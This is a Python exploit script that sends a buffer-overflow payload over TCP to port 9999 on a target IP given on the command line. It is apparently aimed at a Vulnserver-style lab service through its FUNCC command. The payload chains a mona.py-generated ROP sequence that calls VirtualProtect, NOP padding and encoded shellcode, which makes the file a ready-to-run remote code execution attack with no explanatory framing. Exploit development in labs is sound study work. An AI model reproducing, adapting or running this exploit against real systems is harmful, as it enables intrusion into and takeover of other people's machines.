#!/usr/bin/env python3

#! /bin/python3

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.

# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port

SHELL =  b""
SHELL += b"\xd9\xc0\xd9\x74\x24\xf4\xb8\xcd\x02\xb7\xd2\x5e"
SHELL += b"\x2b\xc9\xb1\x52\x83\xee\xfc\x31\x46\x13\x03\x8b"
SHELL += b"\x11\x55\x27\xef\xfe\x1b\xc8\x0f\xff\x7b\x40\xea"
SHELL += b"\xce\xbb\x36\x7f\x60\x0c\x3c\x2d\x8d\xe7\x10\xc5"
SHELL += b"\x06\x85\xbc\xea\xaf\x20\x9b\xc5\x30\x18\xdf\x44"
SHELL += b"\xb3\x63\x0c\xa6\x8a\xab\x41\xa7\xcb\xd6\xa8\xf5"
SHELL += b"\x84\x9d\x1f\xe9\xa1\xe8\xa3\x82\xfa\xfd\xa3\x77"
SHELL += b"\x4a\xff\x82\x26\xc0\xa6\x04\xc9\x05\xd3\x0c\xd1"
SHELL += b"\x4a\xde\xc7\x6a\xb8\x94\xd9\xba\xf0\x55\x75\x83"
SHELL += b"\x3c\xa4\x87\xc4\xfb\x57\xf2\x3c\xf8\xea\x05\xfb"
SHELL += b"\x82\x30\x83\x1f\x24\xb2\x33\xfb\xd4\x17\xa5\x88"
SHELL += b"\xdb\xdc\xa1\xd6\xff\xe3\x66\x6d\xfb\x68\x89\xa1"
SHELL += b"\x8d\x2b\xae\x65\xd5\xe8\xcf\x3c\xb3\x5f\xef\x5e"
SHELL += b"\x1c\x3f\x55\x15\xb1\x54\xe4\x74\xde\x99\xc5\x86"
SHELL += b"\x1e\xb6\x5e\xf5\x2c\x19\xf5\x91\x1c\xd2\xd3\x66"
SHELL += b"\x62\xc9\xa4\xf8\x9d\xf2\xd4\xd1\x59\xa6\x84\x49"
SHELL += b"\x4b\xc7\x4e\x89\x74\x12\xc0\xd9\xda\xcd\xa1\x89"
SHELL += b"\x9a\xbd\x49\xc3\x14\xe1\x6a\xec\xfe\x8a\x01\x17"
SHELL += b"\x69\x75\x7d\x16\x56\x1d\x7c\x18\xb7\x4d\x09\xfe"
SHELL += b"\xad\x7d\x5c\xa9\x59\xe7\xc5\x21\xfb\xe8\xd3\x4c"
SHELL += b"\x3b\x62\xd0\xb1\xf2\x83\x9d\xa1\x63\x64\xe8\x9b"
SHELL += b"\x22\x7b\xc6\xb3\xa9\xee\x8d\x43\xa7\x12\x1a\x14"
SHELL += b"\xe0\xe5\x53\xf0\x1c\x5f\xca\xe6\xdc\x39\x35\xa2"
SHELL += b"\x3a\xfa\xb8\x2b\xce\x46\x9f\x3b\x16\x46\x9b\x6f"
SHELL += b"\xc6\x11\x75\xd9\xa0\xcb\x37\xb3\x7a\xa7\x91\x53"
SHELL += b"\xfa\x8b\x21\x25\x03\xc6\xd7\xc9\xb2\xbf\xa1\xf6"
SHELL += b"\x7b\x28\x26\x8f\x61\xc8\xc9\x5a\x22\xe8\x2b\x4e"
SHELL += b"\x5f\x81\xf5\x1b\xe2\xcc\x05\xf6\x21\xe9\x85\xf2"
SHELL += b"\xd9\x0e\x95\x77\xdf\x4b\x11\x64\xad\xc4\xf4\x8a"
SHELL += b"\x02\xe4\xdc"


def create_rop_chain():
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x752ee831,  # POP ESI # RETN [ucrtbase.dll] ** REBASED ** ASLR 
      0x753a6164,  # ptr to &VirtualProtect() [IAT ucrtbase.dll] ** REBASED ** ASLR
      0x766f47e1,  # MOV ESI,DWORD PTR DS:[ESI] # ADD AL,0 # MOV EAX,C00000BB # RETN 0x1C [KERNELBASE.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x76798172,  # POP EBP # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x62501129,  # & jmp esp [Essfun.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x752fd962,  # POP EAX # RETN [ucrtbase.dll] ** REBASED ** ASLR 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x75949824,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x752ab2d6,  # XCHG EAX,EBX # RETN [ucrtbase.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x76756ce4,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x759253f7,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x7723a5ba,  # XCHG EAX,EDX # RETN [ntdll.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ecx:---]
      0x77110dcb,  # POP ECX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x7714a9d6,  # &Writable location [RPCRT4.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x752f1b85,  # POP EDI # RETN [ucrtbase.dll] ** REBASED ** ASLR 
      0x75949826,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x7672be42,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x7660b6af,  # PUSHAD # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    ]

    return b''.join(struct.pack('<I', _) for _ in rop_gadgets)

buff = 8

PAYLOAD = (
    b'FUNCC /.' +
    create_rop_chain() + 
    b'\x90' * buff + 
    SHELL +
    b'\x90' * (792 - (len(create_rop_chain()) + len(SHELL) + buff)) +
    struct.pack('<L', 0x0015499A) # This will need to be a function in a module with CFG enabled
)


with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)